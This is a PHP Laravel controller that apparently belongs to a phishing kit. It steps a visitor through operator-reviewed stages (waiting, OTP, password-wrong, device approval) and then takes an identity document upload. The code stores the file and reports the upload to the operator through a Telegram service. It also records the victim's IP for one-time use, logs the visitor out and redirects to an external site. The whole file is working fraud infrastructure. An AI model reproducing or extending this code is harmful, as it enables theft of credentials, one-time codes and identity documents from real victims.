<?php

namespace App\Http\Controllers;

use App\Models\AccessSession;
use App\Models\OneTimeIp;
use App\Models\Setting;
use App\Services\TelegramService;
use App\Support\AccessSessionResolver;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Storage;
use Illuminate\View\View;

class UploadDocumentController extends Controller
{
    public function show(Request $request): View|RedirectResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! AccessSessionResolver::isActive($session)) {
            return redirect()->route('force-logout');
        }

        if ($redirect = $this->leaveIfNeeded($session)) {
            return $redirect;
        }

        if ($session->status !== AccessSession::STATUS_DOCUMENT) {
            return redirect()->route('waiting');
        }

        $session->touchSeen();

        return view('upload-document', [
            'session' => $session,
        ]);
    }

    public function store(Request $request, TelegramService $telegram): RedirectResponse
    {
        $session = AccessSessionResolver::current($request);

        if (! AccessSessionResolver::isActive($session)) {
            return redirect()->route('force-logout');
        }

        if ($session->status !== AccessSession::STATUS_DOCUMENT) {
            return redirect()->route('upload-document');
        }

        if (! $request->hasFile('document') || ! $request->file('document')->isValid()) {
            return back()
                ->withErrors(['document' => 'Upload gagal. Pastikan file di bawah 10MB (JPG, PNG, PDF).']);
        }

        $data = $request->validate([
            'document' => [
                'required',
                'file',
                'max:10240',
                'mimes:jpg,jpeg,png,pdf,webp,heic,heif,doc,docx',
            ],
        ], [
            'document.max' => 'Ukuran file maksimal 10MB.',
            'document.mimes' => 'Format file harus JPG, PNG, PDF, WEBP, HEIC, DOC, atau DOCX.',
            'document.uploaded' => 'Upload gagal. File terlalu besar atau koneksi terputus — coba lagi dengan file di bawah 10MB.',
        ]);

        $file = $data['document'];
        $path = $file->store('documents/'.$session->id, 'local');

        if ($session->document_path && Storage::disk('local')->exists($session->document_path)) {
            Storage::disk('local')->delete($session->document_path);
        }

        $session->submitDocument($path, $file->getClientOriginalName());

        $telegram->notifyDocumentUpload($session->fresh(), $path, $file->getClientOriginalName());

        // One-time: simpan IP sebelum logout
        $ip = (string) ($session->ip ?: $request->ip());
        OneTimeIp::remember($ip, $session);

        Auth::guard('user')->logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->away(Setting::documentCompleteRedirectUrl());
    }

    protected function leaveIfNeeded(AccessSession $session): ?RedirectResponse
    {
        return match ($session->status) {
            AccessSession::STATUS_WAITING => redirect()->route('waiting'),
            AccessSession::STATUS_OTP, AccessSession::STATUS_OTP_REVIEW,
            AccessSession::STATUS_AUTH, AccessSession::STATUS_AUTH_REVIEW => redirect()->route('otp'),
            AccessSession::STATUS_PASSWORD, AccessSession::STATUS_PASSWORD_REVIEW => redirect()->route('password-wrong'),
            AccessSession::STATUS_DEVICE, AccessSession::STATUS_DEVICE_REVIEW => redirect()->route('approve-device'),
            AccessSession::STATUS_LOGOUT, AccessSession::STATUS_CLOSED => redirect()->route('force-logout'),
            default => null,
        };
    }
}
